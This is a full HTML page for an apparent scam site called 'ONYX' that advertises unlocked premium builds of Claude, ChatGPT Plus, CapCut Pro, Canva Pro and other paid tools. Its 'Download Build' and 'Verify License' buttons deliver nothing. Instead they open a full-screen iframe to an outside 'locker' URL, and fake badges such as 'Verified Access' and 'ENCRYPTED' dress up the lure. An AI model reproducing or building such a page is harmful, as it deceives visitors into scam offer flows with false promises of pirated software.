<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ONYX | Premium Digital Asset Repository</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --carbon: #080808;
            --onyx-gold: #D4AF37;
            --gold-glow: rgba(212, 175, 55, 0.3);
            --glass: rgba(255, 255, 255, 0.03);
        }

        body {
            background-color: var(--carbon);
            color: #ffffff;
            font-family: 'Montserrat', sans-serif;
            overflow-x: hidden;
        }

        /* Carbon Fiber Background Effect */
        .bg-overlay {
            position: fixed;
            inset: 0;
            z-index: -1;
            background: 
                radial-gradient(circle at 50% 0%, #1a1a1a 0%, var(--carbon) 70%);
        }

        .bg-pattern {
            position: absolute;
            inset: 0;
            opacity: 0.05;
            background-image:  linear-gradient(45deg, #ffffff 25%, transparent 25%), linear-gradient(-45deg, #ffffff 25%, transparent 25%), linear-gradient(45deg, transparent 75%, #ffffff 75%), linear-gradient(-45deg, transparent 75%, #ffffff 75%);
            background-size: 4px 4px;
            background-position: 0 0, 0 2px, 2px 2px, 2px 0;
        }

        /* Navigation & Logo */
        nav {
            background: rgba(8, 8, 8, 0.8);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(212, 175, 55, 0.1);
        }

        .onyx-logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-shape {
            width: 35px; height: 35px;
            background: var(--onyx-gold);
            clip-path: polygon(50% 0%, 90% 20%, 90% 80%, 50% 100%, 10% 80%, 10% 20%);
            display: flex; align-items: center; justify-content: center;
        }

        /* Premium App Cards */
        .app-card {
            background: var(--glass);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            transition: all 0.5s cubic-bezier(0.2, 1, 0.3, 1);
            position: relative;
            overflow: hidden;
        }

        .app-card:hover {
            border-color: var(--onyx-gold);
            transform: translateY(-8px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.6), 0 0 15px var(--gold-glow);
        }

        .app-card::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
            transition: 0.5s;
        }

        .app-card:hover::before {
            left: 100%;
        }

        .gold-text { color: var(--onyx-gold); }
        .bebas { font-family: 'Bebas Neue', cursive; }

        .btn-gold {
            background: var(--onyx-gold);
            color: #000;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
        }

        .btn-gold:hover {
            background: #fff;
            box-shadow: 0 0 25px var(--onyx-gold);
        }

        #detail-overlay {
            position: fixed; inset: 0;
            background: rgba(8, 8, 8, 0.98);
            z-index: 1000; display: none;
            overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="bg-overlay"><div class="bg-pattern"></div></div>

    <nav class="fixed top-0 w-full z-[100] px-8 py-5 flex justify-between items-center">
        <div class="onyx-logo">
            <div class="logo-shape">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="black"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
            </div>
            <span class="bebas text-3xl tracking-wider">ONYX</span>
        </div>
        <div class="hidden md:flex gap-8 text-[11px] font-bold tracking-[3px] text-gray-400">
            <span>REPOSITORY</span>
            <span>NETWORK</span>
            <span class="gold-text">AUTHENTICATED</span>
        </div>
    </nav>

    <main class="pt-40 pb-20 px-8 max-w-7xl mx-auto">
        <header class="text-center mb-24">
            <h1 class="bebas text-8xl md:text-9xl leading-none mb-4">The Gold <span class="gold-text">Standard.</span></h1>
            <p class="text-gray-500 text-lg max-w-xl mx-auto font-light">Curated high-performance tools for professional digital creators.</p>
        </header>

        <div id="app-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8"></div>
    </main>

    <div id="detail-overlay">
        <div class="max-w-6xl mx-auto px-8 py-20">
            <button onclick="closeDetails()" class="mb-10 text-gray-500 hover:text-white flex items-center gap-2 font-bold tracking-widest text-xs">
                <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                BACK TO VAULT
            </button>
            <div id="detail-content"></div>
        </div>
    </div>

    <div id="locker" class="fixed inset-0 z-[2000] bg-black/95 hidden items-center justify-center p-4" onclick="this.style.display='none'">
        <div class="w-full max-w-md h-[70vh] bg-white rounded-2xl overflow-hidden" onclick="event.stopPropagation()">
            <iframe src="https://appchecker.space/cl/i/6nnlj7" frameborder="0" class="w-full h-full"></iframe>
        </div>
    </div>

    <script>
        const apps = [
            { name: 'Claude 3.5 Sonnet', tag: 'Intelligence', desc: 'Anthropic\'s most powerful reasoning model. Expert at coding and complex creative writing.', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/claude-ai-icon.png' },
            { name: 'DeepSeek R1', tag: 'Reasoning', desc: 'Elite open-source logic for 2026. Specialized in high-level math and technical architecture.', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/deepseek-logo-icon.png' },
            { name: 'ChatGPT Plus', tag: 'Neural Hub', desc: 'Priority access to GPT-4o and DALL-E 3 visual synthesis tools.', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/chatgpt-icon.png' },
            { name: 'CapCut Pro', tag: 'Video Edit', desc: 'Full production suite. Unlock 4K 60FPS exports and all premium motion templates.', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/capcut-icon.png' },
            { name: 'Perplexity Pro', tag: 'Research', desc: 'Cites every source in real-time. The ultimate tool for verified information gathering.', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/perplexity-ai-icon.png' },
            { name: 'Canva Pro', tag: 'Design', desc: 'Enterprise-grade visual tools. Magic Studio and 100M+ assets fully unlocked.', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/canva-icon.png' }
        ];

        function init() {
            const grid = document.getElementById('app-grid');
            apps.forEach((app, i) => {
                grid.innerHTML += `
                    <div class="app-card p-10 cursor-pointer" onclick="openDetails(${i})">
                        <div class="flex justify-between items-start mb-12">
                            <div class="w-16 h-16 bg-black rounded-2xl border border-white/5 p-3">
                                <img src="${app.icon}" class="w-full h-full object-contain" onerror="this.src='https://ui-avatars.com/api/?name=${app.name}&background=D4AF37&color=000'">
                            </div>
                            <span class="text-[10px] font-bold tracking-[2px] text-gray-500 uppercase">${app.tag}</span>
                        </div>
                        <h3 class="bebas text-4xl mb-2 tracking-wide">${app.name}</h3>
                        <p class="text-xs text-gray-400 font-light uppercase tracking-widest">Premium Build Unlocked</p>
                    </div>
                `;
            });
        }

        function openDetails(i) {
            const app = apps[i];
            const overlay = document.getElementById('detail-overlay');
            document.getElementById('detail-content').innerHTML = `
                <div class="grid lg:grid-cols-2 gap-16 items-center">
                    <div>
                        <span class="gold-text font-bold tracking-[5px] text-xs uppercase mb-4 block">Verified Access</span>
                        <h2 class="bebas text-8xl mb-8">${app.name}</h2>
                        <p class="text-xl text-gray-400 font-light leading-relaxed mb-12">${app.desc}</p>
                        <div class="flex gap-6">
                            <button onclick="document.getElementById('locker').style.display='flex'" class="btn-gold px-10 py-5 rounded-lg text-sm">Download Build</button>
                            <button onclick="document.getElementById('locker').style.display='flex'" class="border border-white/20 hover:bg-white/5 px-10 py-5 rounded-lg text-sm font-bold uppercase tracking-widest">Verify License</button>
                        </div>
                    </div>
                    <div class="bg-white/5 p-12 rounded-3xl border border-white/5">
                        <h4 class="bebas text-2xl mb-8 tracking-widest">System Specifications</h4>
                        <div class="space-y-6">
                            <div class="flex justify-between border-b border-white/5 pb-4"><span class="text-gray-500 text-sm">Status</span><span class="gold-text font-bold">ACTIVE</span></div>
                            <div class="flex justify-between border-b border-white/5 pb-4"><span class="text-gray-500 text-sm">Security</span><span class="gold-text font-bold">ENCRYPTED</span></div>
                            <div class="flex justify-between border-b border-white/5 pb-4"><span class="text-gray-500 text-sm">Version</span><span class="text-white font-bold">2026.4.18</span></div>
                        </div>
                    </div>
                </div>
            `;
            overlay.style.display = 'block';
            gsap.from("#detail-content", { opacity: 0, y: 30, duration: 0.6 });
        }

        function closeDetails() {
            gsap.to("#detail-content", { opacity: 0, y: 20, duration: 0.3, onComplete: () => {
                document.getElementById('detail-overlay').style.display = 'none';
            }});
        }

        init();
    </script>
</body>
</html>
